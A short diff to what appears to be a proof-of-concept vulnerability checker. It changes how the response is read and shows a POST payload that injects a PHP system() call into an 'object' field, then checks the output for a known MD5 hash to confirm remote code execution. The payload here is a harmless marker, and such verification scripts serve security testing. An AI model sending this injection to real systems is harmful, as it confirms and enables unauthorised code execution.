@@ -55,7 +55,7 @@ class Poc(ABPoc):
                 command = {
                     'object': '''1;system('echo -n "beebeeto"|md5sum;');exit''', }
 
-                content = requests.post(verify_url, data=command).content
+                content = requests.post(verify_url, data=command).text
                 if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
                     #args['success'] = True
                     #args['poc_ret']['vul_url'] = verify_url
